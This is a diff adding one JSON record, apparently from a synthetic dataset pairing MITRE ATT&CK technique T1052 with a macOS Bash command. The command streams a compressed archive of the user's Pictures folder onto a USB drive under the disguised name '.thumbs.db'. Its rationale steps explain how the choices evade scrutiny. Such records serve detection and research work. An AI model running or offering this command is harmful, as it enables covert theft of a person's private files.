@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - ~/Pictures | dd of=/Volumes/USB/.thumbs.db bs=1m",
+  "explanation": "Streams a compressed archive of local pictures into a disguised file on the external drive using dd for efficient large writes.",
+  "rationale_steps": [
+    "Compress target data locally to reduce transfer size.",
+    "Write sequentially to USB to minimize IO artifacts.",
+    "Use a benign-looking filename to reduce scrutiny.",
+    "No network channels are involved; data leaves via the device."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-19e64b98-b963ad30",
+  "source_prompt_hash": "19e64b98",
+  "timestamp_utc": "2025-09-30T05:31:52.812086Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
